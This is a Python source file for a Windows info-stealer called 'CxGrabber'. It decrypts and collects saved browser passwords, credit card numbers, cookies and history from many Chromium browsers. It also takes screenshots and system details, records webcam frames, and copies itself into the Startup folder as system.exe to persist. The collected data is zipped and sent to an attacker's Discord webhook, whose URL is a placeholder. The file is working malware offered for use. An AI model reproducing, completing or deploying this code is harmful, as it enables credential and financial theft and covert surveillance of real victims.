import random
import subprocess
import socket
import base64
import json
import os
import shutil
import sqlite3
import sys
import zipfile
import glob
from PIL import Image
import win32com.client

from datetime import datetime, timedelta

import cv2
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook, DiscordEmbed
from mss import mss


# Get HWID


def get_id():
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    return current_machine_id


# Make Dir


def makeDir():
    if not os.path.exists('C:/Users/Public/CxG'):
        os.mkdir("C:/Users/Public/CxG")
        os.mkdir("C:/Users/Public/CxG/Cam")
        os.mkdir("C:/Users/Public/CxG/Cam/0")
        os.mkdir("C:/Users/Public/CxG/Cam/1")
        os.mkdir("C:/Users/Public/CxG/Cam/2")
        os.mkdir("C:/Users/Public/CxG/Cam/3")
        os.mkdir("C:/Users/Public/CxG/Cam/4")

        print("Made Dir")


# Get SS


def takeSS():
    with mss() as sct:
        sct.shot(mon=-1, output="C:/Users/Public/CxG/ss.png")
    with open('C:/Users/Public/CxG/ss.png', 'rb') as f:
        file_data = f.read()
    webhook.content = f'```{os.environ.get("USERNAME")} | Current Screen | HWID: {get_id()}```'
    webhook.add_file(file_data, f'CxG_{os.environ.get("USERNAME")}_Current_Screen.png')
    webhook.execute()
    webhook.remove_files()
    print("Done SS")


# Get Infos


def getInfos():
    webhook.add_embed(embed)
    webhook.content = f'```{os.environ.get("USERNAME")} | General Infos | HWID: {get_id()}```'
    embed.set_title(f'CxG IP')
    hostname = socket.gethostname()
    Socket_IP = socket.gethostbyname(hostname)
    process = subprocess.run("systeminfo", capture_output=True, shell=True)
    output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n")
    with open('C:/Users/Public/CxG/infos.txt', 'w+') as f:
        f.write(output)
    f.close()
    embed.set_description(
        f"\n\n| IP Address (Socket) > `{Socket_IP}` |\n| Pc Name > `{hostname}` |\n| HWID `{get_id()}` |\n")
    with open('C:/Users/Public/CxG/infos.txt', 'rb') as f:
        infoData = f.read()
    webhook.add_file(infoData, f'CxG_{os.environ.get("USERNAME")}_Pc_Infos.txt')
    webhook.execute()
    webhook.remove_embeds()
    webhook.remove_files()
    print("Done getInfos")


# Get Browser


def getBrowsers():
    try:
        appdata = os.getenv('LOCALAPPDATA')

        browsers = {
            'avast': appdata + '\\AVAST Software\\Browser\\User Data',
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }

        data_queries = {
            'login_data': {
                'query': 'SELECT action_url, username_value, password_value FROM logins',
                'file': '\\Login Data',
                'columns': ['URL', 'Email', 'Password'],
                'decrypt': True
            },
            'credit_cards': {
                'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
                'file': '\\Web Data',
                'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
                'decrypt': True
            },
            'cookies': {
                'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
                'file': '\\Network\\Cookies',
                'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
                'decrypt': True
            },
            'history': {
                'query': 'SELECT url, title, last_visit_time FROM urls',
                'file': '\\History',
                'columns': ['URL', 'Title', 'Visited Time'],
                'decrypt': False
            },
            'downloads': {
                'query': 'SELECT tab_url, target_path FROM downloads',
                'file': '\\History',
                'columns': ['Download URL', 'Local Path'],
                'decrypt': False
            }
        }

        def get_master_key(path: str):
            if not os.path.exists(path):
                return

            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                return

            with open(path + "\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            key = CryptUnprotectData(key, None, None, None, 0)[1]
            return key

        def decrypt_password(buff: bytes, key: bytes) -> str:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()

            return decrypted_pass

        def save_results(browser_name, type_of_data, content):
            if os.path.exists('C:/Users/Public/CxG'):
                if not os.path.exists(f'C:/Users/Public/CxG/{browser_name}'):
                    os.mkdir(f'C:/Users/Public/CxG/{browser_name}')
            else:
                os.mkdir('C:/Users/Public/CxG')
                if not os.path.exists(f'C:/Users/Public/CxG/{browser_name}'):
                    os.mkdir(f'C:/Users/Public/CxG/{browser_name}')
            if content is not None:
                open(f'C:/Users/Public/CxG/{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
            else:
                print(f"\t [-] No Data Found!")
            zf = zipfile.ZipFile(f"C:/Users/Public/CxG/{browser_name}.zip", "w")
            for dirname, subdirs, files in os.walk(f'C:/Users/Public/CxG/{browser_name}'):
                zf.write(dirname)
                for filename in files:
                    zf.write(os.path.join(dirname, filename))
            zf.close()
            with open(f'C:/Users/Public/CxG/{browser_name}.zip', 'rb') as f:
                BrData = f.read()
            webhook.add_file(BrData, f'CxG_{os.environ.get("USERNAME")}_{browser_name}.zip')

        def get_data(path: str, profile: str, key, type_of_data):
            db_file = f'{path}\\{profile}{type_of_data["file"]}'
            if not os.path.exists(db_file):
                return
            result = ""
            shutil.copy(db_file, 'temp_db')
            conn = sqlite3.connect('temp_db')
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = decrypt_password(row[i], key)
                if data_type_name == 'history':
                    if row[2] != 0:
                        row[2] = convert_chrome_time(row[2])
                    else:
                        row[2] = "0"
                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            conn.close()
            os.remove('temp_db')
            return result

        def convert_chrome_time(chrome_time):
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

        def installed_browsers():
            available = []
            for x in browsers.keys():
                if os.path.exists(browsers[x]):
                    available.append(x)
            return available

        available_browsers = installed_browsers()

        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)

            for data_type_name, data_type in data_queries.items():
                data = get_data(browser_path, "Default", master_key, data_type)
                save_results(browser, data_type_name, data)

        webhook.content = f'```{os.environ.get("USERNAME")} | Browser Infos | HWID: {get_id()}```'
        webhook.execute()
        webhook.remove_files()
        webhook.remove_embeds()
        print("Done Browser Stealin")
    except:
        webhook.content = f'```{os.environ.get("USERNAME")} | Browser Stealing Info | HWID: {get_id()}```'
        webhook.add_embed(embed)
        embed.set_title("Browser Info")
        embed.set_description(
            f"| Status : Failed Browser Stealing |")
        webhook.execute()
        webhook.remove_embeds()
        webhook.remove_files()


# Get Self


def GetSelf() -> tuple[str, bool]:  # Returns the location of the file and whether exe mode is enabled or not
    if hasattr(sys, "frozen"):
        return sys.executable, True
    else:
        return __file__, False


# Get Random String

def GetRandomString(length: int = 5, invisible: bool = False):  # Generates a random string
    if invisible:
        print("Got Random String")
        return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
    else:
        return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=length))


# putInStartup


def copy_to_startup() -> None:
    try:
        startup_path: str = os.path.join(os.getenv("APPDATA"), r"Microsoft/Windows/Start Menu/Programs/Startup")
        dest_path: str = os.path.join(startup_path, "system.exe")
        if not os.path.exists(dest_path):
            try:
                shutil.copyfile(GetSelf()[0], dest_path)
                print("Copyed To Startup")
                webhook.content = f'```{os.environ.get("USERNAME")} | StartUp Info | HWID: {get_id()}```'
                webhook.add_embed(embed)
                embed.set_title("StartUp Info")
                embed.set_description(
                    f"| Status : Successfully Added To StartUp |\n| Path : {os.getenv('APPDATA')}/Microsoft/Windows/Start Menu/Programs/Startup/ .exe |")
                webhook.execute()
                webhook.remove_embeds()
                webhook.remove_files()
            except:
                webhook.content = f'```{os.environ.get("USERNAME")} | StartUp Info | HWID: {get_id()}```'
                webhook.add_embed(embed)
                embed.set_title("StartUp Info")
                embed.set_description(
                    f"| Status : Failed To Add To StartUp |")
                webhook.execute()
                webhook.remove_embeds()
                webhook.remove_files()
        else:
            webhook.content = f'```{os.environ.get("USERNAME")} | StartUp Info | HWID: {get_id()}```'
            webhook.add_embed(embed)
            embed.set_title("StartUp Info")
            embed.set_description(
                f"| Status : File Already In Startup |")
            webhook.execute()
            webhook.remove_embeds()
            webhook.remove_files()
    except:
        webhook.content = f'```{os.environ.get("USERNAME")} | StartUp Info | HWID: {get_id()}```'
        webhook.add_embed(embed)
        embed.set_title("StartUp Info")
        embed.set_description(
            f"| Status : Failed To Put File In StartUp |\n| Reason : Unknown |")
        webhook.execute()
        webhook.remove_embeds()
        webhook.remove_files()


# Get Cam


def getCam():
    try:
        test = 0
        wmi = win32com.client.GetObject("winmgmts:")
        for usb in wmi.InstancesOf("Win32_USBHub"):
            if str(usb.DeviceID).startswith("USB\VID"):
                print(test)
                test = test + 1
            else:
                pass
        for x in range(test):
            try:
                camera = cv2.VideoCapture(x)
                for i in range(50):
                    return_value, image = camera.read()
                    cv2.imwrite(f'C:/Users/Public/CxG/Cam/{x}/{str(i)}.png', image)
                    print(f"Webcam[{x}] Done Pic " + str(i))
                del camera

                frame_folder = f'C:/Users/Public/CxG/Cam/{x}'

                def make_gif():
                    frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
                    frame_one = frames[0]
                    frame_one.save(f"C:/Users/Public/CxG/Cam/Gif{x}.gif", format="GIF", append_images=frames,
                                   save_all=True, duration=5, loop=1)

                make_gif()
                with open(f'C:/Users/Public/CxG/Cam/Gif{x}.gif', 'rb') as f:
                    file_data = f.read()
                webhook.content = f'```{os.environ.get("USERNAME")} | Webcam Number {x} (Last 50 Frames) | HWID: {get_id()}```'
                webhook.add_file(file_data, f'CxG_{os.environ.get("USERNAME")}_CamVid{x}.gif')
                print("Done?")
                webhook.execute()
                webhook.remove_files()
            except:
                webhook.content = f'```{os.environ.get("USERNAME")} | Webcam Info | HWID: {get_id()}```'
                webhook.add_embed(embed)
                embed.set_title("Webcam Info")
                embed.set_description(
                    f"| Status : Failed To Get Webcam  Number {x} |")
                webhook.execute()
                webhook.remove_embeds()
                webhook.remove_files()
    except:
        webhook.content = f'```{os.environ.get("USERNAME")} | Webcam Info | HWID: {get_id()}```'
        webhook.add_embed(embed)
        embed.set_title("Webcam Info")
        embed.set_description(
            f"| Status : Failed To Get Webcam |\n| Reason : Unknown |")
        webhook.execute()
        webhook.remove_embeds()
        webhook.remove_files()


# Get Discord Token (Discord APP)


def getDcTokenApp():
    print("")

# Clean Up


def cleanUp():
    shutil.rmtree('C:/Users/Public/CxG')


# MAIN WEBHOOK INPUT


webhook_url = 'WEBHOOK HERE'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
webhook.username = "CxGrabber"
webhook.avatar_url = "https://cdn.discordapp.com/attachments/1179468939101745152/1180208308221661256/Your_paragraph_text_1.png?ex=657c95a3&is=656a20a3&hm=3ca435b0248245694ad79cffd78864007252382566c4b48b6fea7808ee45dd96&"


# END OF MAIN WEBHOOK INPUT


def runCxG():
    makeDir()
    getInfos()
    takeSS()
    getBrowsers()
    copy_to_startup()
    getCam()
    cleanUp()


runCxG()
